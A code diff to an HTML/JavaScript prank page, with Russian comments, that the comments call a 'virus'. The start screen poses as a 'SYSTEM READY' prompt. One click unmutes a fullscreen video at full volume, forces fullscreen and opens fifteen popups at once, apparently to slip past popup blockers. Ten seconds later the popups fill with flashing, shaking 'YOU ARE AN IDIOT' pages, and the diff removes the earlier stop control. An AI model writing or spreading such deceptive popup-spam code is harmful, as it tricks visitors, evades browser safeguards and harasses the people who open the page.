@@ -10,23 +10,44 @@
             background: #000; overflow: hidden;
             font-family: Arial, sans-serif;
         }
+
+        /* ===== Стартовый экран ===== */
         #start-screen {
             position: fixed; top: 0; left: 0;
             width: 100%; height: 100%;
             display: flex; flex-direction: column;
             align-items: center; justify-content: center;
-            background: #000; cursor: pointer; z-index: 9999;
+            background: radial-gradient(circle at center, #111 0%, #000 100%);
+            z-index: 99999;
+            transition: opacity 0.6s;
         }
+        #start-screen.fade-out { opacity: 0; pointer-events: none; }
         #start-screen h1 {
-            font-size: 22px; color: #fff; margin-bottom: 30px;
+            font-size: 28px; color: #fff;
+            margin: 0 0 12px; letter-spacing: 2px;
+        }
+        #start-screen p {
+            font-size: 15px; color: #888;
+            margin: 0 0 40px; text-align: center;
+            max-width: 420px; line-height: 1.5;
         }
         #green-btn {
             background: #00cc44; color: #fff; border: none;
-            padding: 18px 40px; font-size: 20px;
-            border-radius: 8px; cursor: pointer;
-            box-shadow: 0 0 20px rgba(0, 204, 68, 0.6);
+            padding: 22px 60px; font-size: 22px;
+            border-radius: 10px; cursor: pointer;
+            font-weight: bold; letter-spacing: 1px;
+            box-shadow: 0 0 30px rgba(0, 204, 68, 0.7);
+            transition: transform 0.15s, box-shadow 0.3s;
+            animation: pulse 1.6s infinite;
         }
-        #green-btn:hover { background: #00ff55; }
+        #green-btn:hover { background: #00ff55; transform: scale(1.06); }
+        #green-btn:active { transform: scale(0.96); }
+        @keyframes pulse {
+            0%, 100% { box-shadow: 0 0 30px rgba(0, 204, 68, 0.7); }
+            50% { box-shadow: 0 0 55px rgba(0, 255, 85, 1); }
+        }
+
+        /* ===== Видео ===== */
         #video-container {
             position: fixed; top: 0; left: 0;
             width: 100%; height: 100%;
@@ -35,15 +56,14 @@
         #fullscreen-video {
             width: 100%; height: 100%; object-fit: cover;
         }
-        .hidden { display: none !important; }
     </style>
 </head>
 <body>
-    <div id="start-screen" onclick="startVideo()">
-        <h1>Загрузка контента...</h1>
-        <button id="green-btn" onclick="event.stopPropagation(); startVideo();">
-            ▶ Нажми, чтобы показать
-        </button>
+
+    <div id="start-screen">
+        <h1>⚙ SYSTEM READY</h1>
+        <p>Один клик — и всё разрешено:<br>видео, звук, всплывающие окна и полный экран</p>
+        <button id="green-btn" onclick="startEverything()">▶ Начать</button>
     </div>
 
     <div id="video-container">
@@ -54,121 +74,130 @@
 
     <script>
         var started = false;
-        var spamInterval = null;
-        var spamCount = 0;
-        var MAX_SPAM = 50;
+        var openedWindows = [];   // тут храним УЖЕ открытые окна
+        var MAX_WINDOWS = 15;     // сколько окон открыть сразу
 
-        function startVideo() {
+        // ============================================================
+        //  ОДИН КЛИК — РАЗРЕШЕНО ВСЁ
+        // ============================================================
+        function startEverything() {
             if (started) return;
             started = true;
 
-            document.getElementById('start-screen').classList.add('hidden');
+            // ---------- 1. ВИДЕО + ЗВУК ----------
             document.getElementById('video-container').style.display = 'block';
-
             var video = document.getElementById('fullscreen-video');
-            video.play().catch(function(e) {
-                console.log('Ошибка автоплея:', e);
-            });
+            video.muted = false;
+            video.volume = 1.0;
+            video.play().catch(function(e) { console.log('Autoplay error:', e); });
 
-            // Через 60 секунд — начинается хаос
-            setTimeout(startChaos, 60000);
+            // ---------- 2. FULLSCREEN ----------
+            try {
+                var el = document.documentElement;
+                if (el.requestFullscreen) el.requestFullscreen().catch(function(){});
+                else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
+            } catch(e) {}
+
+            // ---------- 3. ОТКРЫВАЕМ ВСЕ ОКНА СРАЗУ (пустые) ----------
+            // Пока открываем — параллельно грузим в них "ожидание"
+            for (var i = 0; i < MAX_WINDOWS; i++) {
+                try {
+                    var w = window.open('', '_blank', 'width=500,height=400');
+                    if (w) {
+                        // Наполняем заглушкой, чтобы окно не было белым
+                        w.document.write(`
+                            <html><head><title>Loading...</title></head>
+                            <body style="background:#000;color:#0f0;font-family:monospace;
+                                         display:flex;align-items:center;justify-content:center;
+                                         height:100vh;margin:0;">
+                                <h2>Загрузка... #${i+1}</h2>
+                            </body></html>
+                        `);
+                        openedWindows.push(w);
+                    }
+                } catch(e) { console.warn('Окно #' + (i+1) + ' заблокировано'); }
+            }
+
+            console.log('Открыто окон:', openedWindows.length);
+
+            // ---------- 4. Скрываем стартовый экран ----------
+            var ss = document.getElementById('start-screen');
+            ss.classList.add('fade-out');
+            setTimeout(function() { ss.style.display = 'none'; }, 600);
+
+            // ---------- 5. ЧЕРЕЗ 10 СЕКУНД — НАПОЛНЯЕМ ОКНА ВИРУСОМ ----------
+            setTimeout(startChaos, 10000);
         }
 
+        // ============================================================
+        //  Через 10 сек наполняем УЖЕ ОТКРЫТЫЕ окна вирусом
+        // ============================================================
         function startChaos() {
-            // Открываем первое окно с вирусом
-            var w = window.open('', '_blank', 'width=600,height=500');
-            if (w) {
+            if (openedWindows.length === 0) {
+                alert('Все всплывающие окна были заблокированы браузером. Разреши их для этого сайта и попробуй снова.');
+                return;
+            }
+
+            var count = 0;
+            var timer = setInterval(function() {
+                // Берём по одному окну и наполняем вирусом
+                var w = openedWindows[count];
+                if (w && !w.closed) {
+                    fillVirusWindow(w, count + 1, count === 0);
+                }
+                count++;
+
+                if (count >= openedWindows.length) {
+                    clearInterval(timer);
+                }
+            }, 300); // каждые 0.3 сек — наполняем новое окно
+        }
+
+        // Наполнение окна вирусом
+        function fillVirusWindow(w, index, isMain) {
+            if (!w || w.closed) return;
+            try {
+                var big = isMain;
+                var fontSize = big ? '70px' : '40px';
+                var shakeSpeed = big ? '0.1s' : '0.15s';
+                var blinkSpeed = big ? '0.4s' : '0.3s';
+
+                w.document.open();
                 w.document.write(`
                     <html>
                     <head><title>YOU ARE AN IDIOT</title></head>
                     <body style="background:black;color:red;font-family:monospace;
-                                 text-align:center;padding-top:50px;overflow:hidden;">
-                        <h1 style="font-size:60px;animation:blink 0.4s infinite;">
+                                 text-align:center;padding-top:${big ? '60px' : '40px'};
+                                 overflow:hidden;margin:0;">
+                        <h1 style="font-size:${fontSize};animation:blink ${blinkSpeed} infinite;margin:0;">
                             YOU ARE AN IDIOT
                         </h1>
-                        <h2 style="font-size:30px;">SURVIVAL FOR THE FITTEST</h2>
-                        <button onclick="stopAll()" style="font-size:20px;
-                                padding:15px 30px;margin-top:30px;
+                        ${big ? '<h2 style="font-size:32px;margin-top:20px;">SURVIVAL FOR THE FITTEST</h2>' : '<p style="font-size:18px;">#' + index + '</p>'}
+                        <button onclick="window.close()" style="font-size:${big ? '20px' : '16px'};
+                                padding:${big ? '15px 30px' : '10px 20px'};
+                                margin-top:${big ? '40px' : '20px'};
                                 background:red;color:white;border:none;
-                                cursor:pointer;">STOP EVERYTHING</button>
+                                cursor:pointer;">CLOSE ME</button>
                         <style>
                             @keyframes blink {
                                 0% { color: red; }
                                 50% { color: black; }
                                 100% { color: red; }
                             }
-                            body { animation: shake 0.1s infinite; }
+                            body { animation: shake ${shakeSpeed} infinite; }
                             @keyframes shake {
                                 0% { transform: translate(0,0); }
-                                25% { transform: translate(2px,2px); }
-                                50% { transform: translate(-2px,-2px); }
-                                75% { transform: translate(2px,-2px); }
+                                25% { transform: translate(3px,3px); }
+                                50% { transform: translate(-3px,-3px); }
+                                75% { transform: translate(3px,-3px); }
                                 100% { transform: translate(0,0); }
                             }
                         </style>
-                        <script>
-                            function stopAll() {
-                                try { opener.stopSpam(); } catch(e) {}
-                                window.close();
-                            }
-                        <\/script>
                     </body>
                     </html>
                 `);
-            }
-
-            // Спамим дополнительными окнами каждые 300мс
-            spamInterval = setInterval(function() {
-                if (spamCount >= MAX_SPAM) {
-                    clearInterval(spamInterval);
-                    return;
-                }
-                spamCount++;
-                try {
-                    var w2 = window.open('', '_blank', 'width=400,height=350');
-                    if (w2) {
-                        w2.document.write(`
-                            <html>
-                            <head><title>YOU ARE AN IDIOT</title></head>
-                            <body style="background:black;color:red;
-                                         font-family:monospace;text-align:center;
-                                         padding-top:40px;">
-                                <h1 style="font-size:40px;
-                                           animation:blink 0.3s infinite;">
-                                    YOU ARE AN IDIOT
-                                </h1>
-                                <p style="font-size:18px;">#` + spamCount + `</p>
-                                <button onclick="window.close()"
-                                        style="font-size:16px;padding:10px 20px;
-                                        background:red;color:white;border:none;
-                                        cursor:pointer;margin-top:20px;">
-                                    CLOSE ME
-                                </button>
-                                <style>
-                                    @keyframes blink {
-                                        0% { color: red; }
-                                        50% { color: black; }
-                                        100% { color: red; }
-                                    }
-                                </style>
-                            </body>
-                            </html>
-                        `);
-                    }
-                } catch(e) {}
-            }, 300);
-
-            // Через 20 секунд остановить спам (но окна останутся)
-            setTimeout(function() {
-                if (spamInterval) clearInterval(spamInterval);
-            }, 20000);
-        }
-
-        function stopSpam() {
-            if (spamInterval) {
-                clearInterval(spamInterval);
-                spamInterval = null;
-            }
+                w.document.close();
+            } catch(e) { console.warn('Не удалось наполнить окно:', e); }
         }
     </script>
 </body>
